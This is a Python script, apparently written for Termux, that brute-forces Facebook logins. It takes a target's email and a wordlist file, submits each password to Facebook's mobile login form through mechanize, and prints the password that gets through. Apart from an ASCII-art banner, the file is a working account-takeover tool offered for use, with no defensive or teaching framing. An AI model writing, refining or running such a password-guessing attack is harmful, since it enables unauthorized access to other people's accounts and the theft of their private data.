#!/data/data/com.termux/files/usr/bin/python
import mechanize
from time import sleep
import sys
from mechanize import Browser
import readline
readline.parse_and_bind("tab:complete")
def banner():
        print("\033[1;32m")
        print("┌─────────────────────┐".center(50))
        print("│                     │".center(50))
        print("│      ███████████    │".center(50))
        print("│     ░░███░░░░░░█    │".center(50))
        print("│      ░███   █ ░     │".center(50))
        print("│      ░███████       │".center(50))
        print("│      ░███░░░█       │".center(50))
        print("│      ░███  ░        │".center(50))
        print("│      █████          │".center(50))
        print("│     ░░░░░           │".center(50))
        print("│                     │".center(50))
        print("└─────────────────────┘".center(50))
        print("    ___________                               ".center(50))
        print("    \_   _____/ _____      ____     ____      ".center(50))
        print("     |    __)   \__  \   _/ ___\  _/ __ \     ".center(50))
        print("     |     \     / __ \_ \  \___  \  ___/     ".center(50))
        print("     \___  /    (____  /  \___  >  \___  >    ".center(50))
        print("         \/          \/       \/       \/     ".center(50))
        print("    ┌──────────────────────┐┌─────────────────┐ ".center(50))
        print("    │[+] By : AhmedBAGLAB  ││[*] Version : 1.0│ ".center(50))
        print("    └──────────────────────┘└─────────────────┘ ".center(50))
        print("          [*] BRUTEFORCE FOR FACEBOOK [*]       ".center(50))
        print("                                              ".center(50))

banner()
def pro_input(label):
    while True:
        try:
            Getext=input(label)
            if Getext.split() :
                break;
        except:
            print();
    return Getext

def TrF(email,password):
    br=Browser()
    br.set_handle_robots(False);
    br.addheaders=[("User-agent","firefox/5.0")];
    br.open("https://m.facebook.com/login.php");
    br.select_form(nr=0) # don't try to select the form by his id in this place
    br.form["email"]=email;
    br.form["pass"]=password;
    br.submit()
    try:
        br.select_form(id="login_form");
        return False
    except mechanize._mechanize.FormNotFoundError:
        return True

Email=pro_input("     ( Email ) : ")
if Email.split()[0].lower()  == "exit" :
    sleep(1)
    print()
    print("    [*] closing Face  ... ")
    print("\033[0m")
    sleep(1)
    sys.exit(0)
while True:
    passwords=pro_input("     ( Passwords ) : ")
    if passwords.split()[0].lower()  == "exit" :
        sleep(1)
        print()
        print("    [*] closing Face  ... ")
        print("\033[0m")
        sleep(1)
        sys.exit(0)
    try:
        file=open(passwords)
        passwords=[i.strip() for i in file.readlines()]
        print()
        break;
    except:
        print()
        print(f" [!] There is no file with this Name ".center(50))
        print()

for password in passwords :
    if TrF(Email,password):
        print("=================================".center(50))
        print(f"[+] Password : {password}".center(50))
        print("=================================".center(50))
        print("\033[0m")
        break;
    else:
        print(f"[-] Password : {password}".center(50))
print("\033[0m")
